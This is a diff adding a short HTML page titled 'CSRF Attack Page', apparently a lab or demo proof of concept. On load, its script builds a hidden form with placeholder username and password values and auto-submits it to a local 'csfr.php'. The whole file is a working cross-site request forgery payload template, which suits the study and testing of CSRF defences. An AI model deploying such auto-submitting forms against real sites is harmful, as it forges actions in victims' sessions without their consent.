@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>CSRF Attack Page</title>
+	<script type="text/javascript">
+		window.onload = function() {
+			var form = document.createElement("form");
+			form.setAttribute("method", "post");
+			form.setAttribute("action", "csfr.php");
+
+			var username = document.createElement("input");
+			username.setAttribute("type", "hidden");
+			username.setAttribute("name", "username");
+			username.setAttribute("value", "valid_username");
+
+			var password = document.createElement("input");
+			password.setAttribute("type", "hidden");
+			password.setAttribute("name", "password");
+			password.setAttribute("value", "valid_password");
+
+			form.appendChild(username);
+			form.appendChild(password);
+
+			document.body.appendChild(form);
+
+			form.submit();
+		}
+	</script>
+</head>
+<body>
+	<p>This page automatically submits a form with a valid username/password combo to csfr.php page</p>
+</body>
+</html>
